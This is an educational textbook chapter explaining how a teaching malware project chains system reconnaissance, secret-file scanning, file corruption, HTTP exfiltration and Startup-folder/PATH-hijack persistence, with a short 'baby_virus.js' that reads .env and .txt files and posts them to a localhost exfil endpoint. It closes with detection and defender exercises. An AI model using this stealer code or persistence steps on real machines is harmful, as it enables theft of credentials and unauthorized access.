# Astranetra: Core CS Concepts

---

# Chapter 10 — Putting It Together: How a Real Virus Works

> **Reading time:** ~30 minutes
> **Prerequisites:** Chapters 0 through 9
> **Next steps:** You've reached the end! 

---

## The Hook

You now know how system calls bridge software and hardware. You know that files are just inodes on a virtual filesystem. You know how processes isolate memory and how threads share it. You know how the bootloader checks registries, how the terminal reads the PATH variable, how hashing creates digital fingerprints, how data routes through the TCP/IP stack, and why SQL databases maintain structure.

Ten chapters of isolated concepts. 

But a real virus doesn't use one concept at a time. It chains them *all* together into a single, devastating, automated pipeline. The strength of malware is not in any one specific technique—it's in the orchestration of many techniques into an inescapable sequence.

In this final chapter, we trace one complete execution of Astranetra. From the exact millisecond you type `node index.js`, to the moment your data is stored in an attacker's database, and the virus has guaranteed it will run again tomorrow.

---

## The Mental Model — The Heist

Think of malware execution like a high-stakes bank heist movie. Every professional heist has distinct, non-negotiable phases:

1. **Reconnaissance (Case the joint):** The crew scouts the bank. How many guards? What kind of vault? Where are the cameras?
2. **Mapping (Find the vault):** They secure the blueprints. They map the exact route to the target without tripping alarms.
3. **Execution (Grab the valuables):** They bypass the locks, grab the diamonds, and secure the loot.
4. **Extraction (Get out):** The getaway car. They move the loot out of the building to a secure safehouse.
5. **Covering Tracks (Ensure return):** They copy the vault keys so they can walk right back in next month without doing the heist all over again.

Astranetra follows this *exact* playbook. We call it the Attack Pipeline.

---

## The Mechanism — The Astranetra Pipeline

When you run `node index.js`, the Node.js binary is loaded into memory by the OS (Chapter 3). The V8 engine compiles your JavaScript. The CLI router in `index.js` (lines 607-752) parses your arguments. If you didn't provide any specific command, it calls `runFullPipeline()` (line 531).

The heist begins.

### Phase 1: System Reconnaissance (Chapter 1)

**The Goal:** The attacker needs to know the victim's environment. Are we in a sandbox? Is it Windows or Linux? How much CPU power do we have for hashing?

**The Code:** `SystemRecon.js` (`runSystemRecon()`)

1. **OS Data:** It makes system calls via Node's `os` module. `os.cpus()` drops to Ring 0, queries the CPU topology, and returns the core count.
2. **Network Adapters:** `os.networkInterfaces()` queries the kernel's network stack to find IP and MAC addresses.
3. **Disk Info:** Here it forks a child process (Chapter 3). On Windows, it uses `execSync` to spawn a massive PowerShell process, which talks to Windows Management Instrumentation to find hard drives. On Linux, it spawns `df -k`. 
4. **Environment:** It reads `process.env` (Chapter 6) from the Process Control Block to map the PATH, HOME, and USER variables.

*Result:* The malware now has a perfect fingerprint of the hardware and OS.

### Phase 2: Filesystem Mapping (Chapters 2 & 4)

**The Goal:** Find the diamonds. Locate all files, specifically targeting `.env`, `.pem`, and SSH keys.

**The Code:** `FileScanner.js` and `scanWorker.js`

1. **The VFS Walk:** The scanner uses `fs.promises.readdir()` to ask the Virtual Filesystem for directory entries (Chapter 2). It ignores whether the NTFS metadata says a file is "hidden." It sees the inodes.
2. **Thread Offloading:** Scanning 1,000,000 files would block the single-threaded Event Loop. So, `FileScanner.js` spawns OS-level threads via `worker_threads` (Chapter 4). 
3. **The Workers:** It creates one `scanWorker.js` instance per root drive. The workers recursively walk the directory trees using async generators. They match filenames against the `sensitivePatterns` array in `config.js`.
4. **Message Passing:** When a worker finds an `.env` file, it serializes a message and sends it via IPC (Inter-Process Communication) to the main thread.

*Result:* The malware knows the exact absolute path to every secret on the hard drive.

### Phase 3: File Access & Integrity (Chapters 2 & 7)

**The Goal:** Prove we can touch the files, and prepare them for extraction.

**The Code:** `CRUDEngine.js` and `IntegrityMonitor.js`

1. **File Descriptors:** The `CRUDEngine` requests file descriptors from the kernel to read the contents of the files found in Phase 2.
2. **Destructive Action:** If commanded, `corruptFile()` uses `crypto.randomBytes()` to overwrite the file's data blocks on disk.
3. **Hashing:** To ensure data hasn't been tampered with (or to track changes over time), `IntegrityMonitor.js` streams the file bytes through the SHA-256 algorithm (Chapter 7). It distributes this math-heavy workload across multiple `hashWorker.js` threads.

*Result:* The files are opened, read, hashed, and prepped. The loot is in the bag.

### Phase 4: Data Exfiltration (Chapters 8 & 9)

**The Goal:** The getaway car. Move the data from the victim's RAM to the attacker's server.

**The Code:** `ExfilEngine.js` and `exfilServer.js`

1. **The TCP/IP Stack:** The malware constructs a massive JSON string containing the Recon data and the Scan data. 
2. **The Socket:** It asks the kernel for a network socket (Chapter 8). It resolves `localhost` (or the attacker's IP) and initiates a TCP 3-way handshake.
3. **The HTTP POST:** It crafts an HTTP POST request, explicitly setting the `Content-Length` header, and pushes the bytes down the OSI model. The packets leave the process, hit the network interface, and travel to the server.
4. **The Database:** On the attacker's server, the Express application receives the packets. It parses the JSON. Instead of writing a messy text file, it loads `sql.js` (Chapter 9). It executes an `INSERT INTO scans` SQL command, writing the payload into a structured, indexed B-Tree in an SQLite database file.

*Result:* The data is gone. The attacker has it permanently stored in a queryable format.

### Phase 5: Persistence (Chapters 5 & 6)

**The Goal:** The heist was successful. But the computer will be turned off tonight. The malware must ensure it is automatically executed again tomorrow without the user clicking anything.

**The Code:** `PersistenceEngine.js` and `PathManipulator.js`

1. **The Self-Copy:** The malware uses `fs.copyFileSync` to duplicate its own source code. (Chapter 5).
2. **The Registry/Startup Folder:** On Windows, it drops the copy into `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`. Tomorrow, when the Windows bootloader finishes and the user session starts, `explorer.exe` will read that folder and execute the malware.
3. **PATH Hijacking:** As a backup, `PathManipulator.js` edits the environment variables (Chapter 6). It uses `execSync('setx PATH ...')` to append a malicious directory to the global PATH variable. If the user ever types `git` or `python` in their terminal, the OS will run the malware's fake script instead of the real program.

*Result:* The malware is immortalized on the system.

---

## The Full Pipeline in Code

If you open `index.js` and look at line 531, you will see this exact heist written in pure JavaScript:

```javascript
// From index.js L531-568
async function runFullPipeline(mods) {
    // PHASE 1: RECON
    const reconData = await mods.recon.runSystemRecon();
    displayRecon(reconData);

    // PHASE 2: SCAN
    const scanData = await mods.scanner.runFileScanner(bar);
    displayScan(scanData);

    // PHASE 3: FILE ACCESS DEMO
    displayFileContents();

    // PHASE 4: EXFIL
    await mods.server.startExfilServer(port, host);
    const exfilResult = await mods.exfil.runExfil(reconData, scanData, { serverOnly: false });
    displayExfil(exfilResult);

    // PHASE 5: PERSISTENCE
    const persistResult = await mods.persist.persist();
    displayPersist(persistResult);

    // END
    displaySummary(reconData, scanData);
}
```
This is the beauty of the **Single Responsibility Principle**. The pipeline function doesn't know *how* to hash a file or how to manipulate the PATH. It just conducts the orchestra. Each core engine does exactly one job perfectly.

---

## The Experiment — The Baby Virus

You don't need 10,000 lines of code to write malware. You just need the pipeline. Create `baby_virus.js`:

```javascript
import os from 'os';
import fs from 'fs';
import http from 'http';

// 1. RECON
const user = os.userInfo().username;
const platform = os.platform();

// 2. SCAN (Just looking in current dir for this demo)
const files = fs.readdirSync('./');
const targetFiles = files.filter(f => f.endsWith('.txt') || f.endsWith('.env'));

// 3. READ
const loot = {};
for (const file of targetFiles) {
    loot[file] = fs.readFileSync(file, 'utf8');
}

// 4. EXFIL
const payload = JSON.stringify({ user, platform, loot });
const req = http.request({
    hostname: 'localhost',
    port: 4444,
    path: '/exfil',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
});
req.write(payload);
req.end();

console.log("Heist complete.");
// Note: We skip Persistence to keep your computer safe!
```

Run this in a directory with a `.txt` file, while Astranetra's server is running on port 4444. It will steal the text file and send it. Four phases in 30 lines.

---

## The Deeper Questions

1. **Detection:** We just built a virus using standard Node.js libraries. If it's just normal code, how does an Antivirus program detect it?
   * *Answer:* Modern AV doesn't just look for bad files (Signature matching). It uses **Heuristics and Behavioral Analysis**. It hooks into the kernel (Chapter 1) and watches system calls. If it sees a program call `os.cpus()`, then rapidly call `fs.readdir()`, then attempt to write to the Startup folder, the AV flags the *behavior* as malicious and kills the process (Chapter 3), even if the code itself looks innocent.
2. **Obfuscation:** Real malware doesn't leave its source code in plain text. Attackers pack, encrypt, and obfuscate their code so AV scanners can't read the strings. When the malware runs, it decrypts itself in memory. How does memory scanning catch this?
3. **The MITRE ATT&CK Framework:** Cybersecurity professionals use a framework to categorize attacker tactics. Look up MITRE ATT&CK. Where does Astranetra fit? 
   * Recon = T1082 (System Information Discovery)
   * Scan = T1083 (File and Directory Discovery)
   * Persistence = T1060 (Registry Run Keys / Startup Folder)
   * Exfil = T1041 (Exfiltration Over C2 Channel)

---

## Challenge Problem — Design a Defender

You've spent 10 chapters thinking like an attacker. Now think like a defender.

Design an **Endpoint Detection and Response (EDR) Agent** in pseudocode. Your agent must:
1. Run constantly in the background without dying (Persistence).
2. Monitor a critical file, like `/etc/passwd` or `astranetra.config.js`, for any unauthorized modifications (Hashing).
3. If a change is detected, immediately identify which Process ID made the change (Processes).
4. Send a secure alert to a security team's dashboard (Networking).

Identify which Astranetra concepts you would use to build the shield instead of the sword.

---

## Final Thoughts

The veil of "magic" in computer science is lifted once you understand the layers underneath. A virus is not magic. A framework is not magic. The cloud is just someone else's computer.

When you understand the primitives—system calls, file descriptors, process control blocks, sockets, and memory—you stop being a consumer of technology and become a creator. You can build anything, debug anything, and defend against anything.

Welcome to the Core.
